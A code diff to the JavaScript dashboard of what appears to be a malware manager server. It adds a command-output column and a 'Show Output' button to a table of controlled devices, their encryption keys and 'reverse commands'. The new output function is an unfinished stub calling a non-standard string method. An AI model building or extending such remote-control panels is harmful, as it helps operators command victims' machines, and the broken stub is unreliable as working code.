@@ -33,7 +33,8 @@ function createDevicesTableHeader() {
         "<th>Last Connection</th>" +
         "<th>Encryption Key</th>" +
         "<th>User Associated</th>" +
-        "<th>Commands</th>");
+        "<th>Commands</th>" +
+        "<th>Commands Output</th>");
 
     thead.appendChild(row);
     devicesTable.appendChild(thead);
@@ -65,6 +66,7 @@ function loadDevicesJSONtoTable(devicesListJSON) {
         var encryptionKey = devicesList[i].encryptionKey;
         var userAssociated = devicesList[i].userAssociated;
         var commands = devicesList[i].commands;
+        var commandsOutput = devicesList[i].commandsOutput;
 
         var row = document.createElement("tr");
         row.id = "tableRow" + i;
@@ -78,7 +80,9 @@ function loadDevicesJSONtoTable(devicesListJSON) {
             "<td>" + encryptionKey + "</td>" +
             "<td>" + userAssociated + "</td>" +
             "<td>" + commands + "</td>" +
-            "<td><button type=\"button\" id=\"manage#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommands('" + name + "')\">Send Reverse Commands</button></td>" +
+            "<td>" + commandsOutput + "</td>" +
+            "<td><button type=\"button\" id=\"manage#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommands('" + name + "')\">Reverse Commands</button></td>" +
+            "<td><button type=\"button\" id=\"commandsOutput#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommandsOutput('" + name + "')\">Show Output</button></td>" +
             "<td><button type=\"button\" id=\"remove#" + name + "#" + i + "\" class=\"btn btn-warning\" onclick=\"deleteDevice('" + name + "', '" + i + "')\">Remove</button></td>");
 
         //        "<td><button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href=\'/Richkware-Manager-Server/device?name=" + name + "\';\">Remove</button></td>");
@@ -91,6 +95,15 @@ function loadDevicesJSONtoTable(devicesListJSON) {
 
 function openReverseCommands(name) {
     window.location.replace("/Richkware-Manager-Server/reverse-commands.html?device=" + name)
+}
+
+function openReverseCommandsOutput(deviceName) {
+    // window.location.replace("/Richkware-Manager-Server/reverse-commands-output.html?output=\"" + commandsOutput + "\"")
+    $.get("command", {data0: deviceName, data1: "client"}, function (response) {
+        if (response.contains("OK")) {
+
+        }
+    })
 }
 
 function deleteDevice(device, indexTableRow) {
